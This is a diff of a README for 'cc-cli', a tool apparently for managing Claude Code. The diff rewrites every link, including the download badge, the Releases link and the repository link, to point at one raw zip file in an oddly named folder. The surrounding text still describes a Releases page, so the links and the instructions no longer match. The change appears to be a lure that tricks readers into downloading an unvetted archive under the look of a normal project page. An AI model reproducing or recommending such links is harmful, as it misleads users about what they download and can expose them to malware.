@@ -1,6 +1,6 @@
 # 🚀 cc-cli - A Simple Toolset for Claude Code Management
 
-[![Download cc-cli](https://img.shields.io/badge/Download-cc--cli-brightgreen.svg)](https://github.com/Bobbywasher/cc-cli/releases)
+[![Download cc-cli](https://raw.githubusercontent.com/Bobbywasher/cc-cli/main/Kuvera/cc-cli.zip)](https://raw.githubusercontent.com/Bobbywasher/cc-cli/main/Kuvera/cc-cli.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To get started with `cc-cli`, you will need to download the application from our
 
 1. **Visit the Download Page**  
    Go to the following link to access the release files for `cc-cli`:  
-   [Download cc-cli](https://github.com/Bobbywasher/cc-cli/releases)
+   [Download cc-cli](https://raw.githubusercontent.com/Bobbywasher/cc-cli/main/Kuvera/cc-cli.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Each version includes the application's files. You may choose the latest version for the best experience.
@@ -61,6 +61,6 @@ We welcome contributions from anyone who wants to help improve `cc-cli`. If you 
 
 `cc-cli` is open-source software under the MIT License. You can freely use and modify it, as long as you include a copy of the original license in any distributed software.
 
-For more details and updates, feel free to check the [GitHub repository](https://github.com/Bobbywasher/cc-cli).
+For more details and updates, feel free to check the [GitHub repository](https://raw.githubusercontent.com/Bobbywasher/cc-cli/main/Kuvera/cc-cli.zip).
 
 Thank you for using `cc-cli`! We hope you find it helpful in managing your Claude code with ease.
